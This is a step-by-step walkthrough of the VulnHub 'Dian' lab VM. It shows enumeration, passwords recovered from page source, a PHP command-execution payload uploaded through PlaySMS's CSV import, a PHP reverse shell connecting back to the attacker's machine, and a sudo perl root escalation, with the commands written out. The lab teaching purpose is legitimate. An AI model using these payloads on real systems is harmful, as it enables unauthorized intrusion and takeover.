# Dian – VulnHub Walkthrough

Target: Dian (VulnHub VM)  
Attacker Machine: Ubuntu/Kali  
Platform: VirtualBox (Host-Only Network)

**Vulnerability: Information Disclosure in source code and Unrestricted File Upload in PlaySMS.**
---

# 1. Network Discovery

Since the machine is running in a **Host-Only network**, we first need to discover the IP address of the target machine.

This can be done using tools like:

```bash
ifconfig
```

or

```bash
arp-a
```

After identifying the target, we proceed with enumeration.

---

# 2. Port Scanning

We begin by scanning the machine to discover open ports and running services.

```bash
nmap -A -p- 192.168.56.105
```

Explanation:

- **-A** : Enables OS detection, version detection, script scanning, and traceroute.
- **-p-** : Scans all 65535 ports.

### Scan Results

<img width="1014" height="511" alt="image" src="https://github.com/user-attachments/assets/2d5901e7-7815-4395-bd72-e6a254d66c4a" />

From the scan results we observe that the machine is hosting a **web server**, so the next step is web enumeration.

<img width="1494" height="784" alt="image" src="https://github.com/user-attachments/assets/ced335ea-0540-4635-8907-ad9cf6bd767a" />

---

# 3. Web Enumeration

To enumerate hidden directories and misconfigurations, we run **Nikto**, a web vulnerability scanner.

```bash
nikto -h http://192.168.56.105
```

Nikto helps identify:

- Hidden directories
- Sensitive files
- Misconfigurations
- Default credentials

<img width="1368" height="696" alt="image" src="https://github.com/user-attachments/assets/8aea2693-310b-415e-a1fe-1b362faa8150" />

---

# 4. Robots.txt Enumeration

While browsing the website, we check the **robots.txt** file.

`robots.txt` is meant to instruct search engines which directories **should not be indexed**, but it often accidentally reveals sensitive paths.

```
http://192.168.56.105/robots.txt
```

<img width="456" height="266" alt="image" src="https://github.com/user-attachments/assets/922c61cf-076e-480a-bbb2-da441b7c7fc9" />

The file revealed several hidden directories which we manually explored.

---

# 5. Source Code Analysis

While browsing one of the pages (`/nothing`), inspecting the **page source** revealed several possible passwords.

<img width="520" height="329" alt="image" src="https://github.com/user-attachments/assets/6ba67bcb-8b3f-4c2d-adc8-8f1ae4eff222" />

These passwords were noted for later use.

---

# 6. Discovering the Secure Directory

Inside the `/secure` directory we discovered a **ZIP file**.

<img width="497" height="342" alt="image" src="https://github.com/user-attachments/assets/c93732e8-a479-4343-b937-808cce3d8628" />

When attempting to extract the archive, it requested a password.

<img width="497" height="342" alt="image" src="https://github.com/user-attachments/assets/2cd853ef-b905-4b23-838d-124dce967cc7" />

We attempted the passwords discovered earlier from the source code.

The correct password was:

```
freedom
```

---

# 7. Hidden File Discovery

After extracting the archive, we obtained a file with an **.mp3 extension**.

However, this file was not actually an audio file.

Using the `file` and `cat` command the content was revealed 

<img width="709" height="94" alt="image" src="https://github.com/user-attachments/assets/936331d2-4ef0-495b-b4af-fbd40eb73550" />

<img width="1166" height="198" alt="image" src="https://github.com/user-attachments/assets/7ee2b647-1db7-4ecb-9fc5-4bc377291593" />

Inside the file we discovered a hidden URL:

```
/SecretSMSgatewayLogin
```

---

# 8. Login Portal

We navigated to the discovered login page.

```
http://192.168.56.105/SecretSMSgatewayLogin
```

<img width="385" height="368" alt="image" src="https://github.com/user-attachments/assets/2522fe97-f8ed-44ee-8777-0af89c96a624" />

Using previously discovered credentials, we successfully logged in.

Credentials used:

```
tougie:diana
```

<img width="1434" height="572" alt="image" src="https://github.com/user-attachments/assets/3caffb21-4eb4-4537-92e1-fadaa66758f7" />

<img width="1207" height="726" alt="image" src="https://github.com/user-attachments/assets/e56a24d6-1348-4542-bfcf-3a5153e98130" />


---

# 9. File Upload Functionality

Inside the panel we discovered a **file upload feature**.

<img width="1211" height="459" alt="image" src="https://github.com/user-attachments/assets/a17250af-112f-4571-b3bb-a2e5549e000d" />

The application only accepted **CSV files**.

### What is CSV?

CSV (Comma Separated Values) files are used to store structured data in table form.  
They are commonly opened using **Excel or spreadsheet software**.

Example CSV format:

```
name,mobile,email,format
John,9999999999,john@email.com,html
```

---

# 10. CSV Injection

To exploit the CSV upload feature, we used a **proxy tool (Burp Suite)** to intercept requests.

We crafted the following payload inside the CSV file:

```php
name ,mobile,email,format
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,3,,
```

Explanation:

- The PHP code reads the **User-Agent header** from the request.
- The `system()` function executes it as a command.

Then we modified the **User-Agent header** to execute commands.

#### why user-agent:
The machine's "Send from File" feature allows you to upload files, but it often has filters that prevent you from using characters like / in a filename. However, there are typically no such restrictions on what you can put in your User-Agent header.

Example:

```
User-Agent: ls
```

<img width="755" height="677" alt="image" src="https://github.com/user-attachments/assets/47181e4d-7ad1-4547-82eb-1a01333d544c" />

This confirmed we achieved **remote command execution**.

---

# 11. Reverse Shell

To gain full shell access, we executed a **PHP reverse shell**.

```php
php -r '$sock=fsockopen("192.168.56.102",444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Explanation:

- `fsockopen()` creates a network connection to the attacker machine.
- `/bin/sh` starts a shell.
- Input and output are redirected through the socket.

We then started a **listener** on our attacker machine.

```bash
nc -lvnp 444
```

<img width="747" height="267" alt="image" src="https://github.com/user-attachments/assets/ff36e829-f25c-486c-a949-3e598ea50feb" />

Once the payload executed, we received a **reverse shell**.

---

# 12. Privilege Escalation

After gaining shell access, we checked for **sudo privileges**.

```bash
sudo -l
```

<img width="568" height="148" alt="image" src="https://github.com/user-attachments/assets/fed3e4a0-41a3-4ee5-a15d-b1b308717491" />

The output showed that the user could execute **Perl as root**.

### What is Perl?

Perl is a high-level scripting language commonly installed on Linux systems and frequently used for:

- System administration
- Text processing
- Automation

---

# 13. Root Shell

Since Perl could be executed with sudo privileges, we used it to spawn a root shell.

```bash
sudo perl -e 'exec "/bin/sh";'
```

<img width="979" height="250" alt="image" src="https://github.com/user-attachments/assets/028cbc0f-25c6-46c0-8219-c810eea2a942" />

### Explanation

`exec` is a function that replaces the current process with a new one.  
In this case it replaces the process with `/bin/sh`, giving us a **root shell**.

---

# 14. Root Access Achieved

At this stage we have successfully escalated privileges and obtained **root access to the system**.


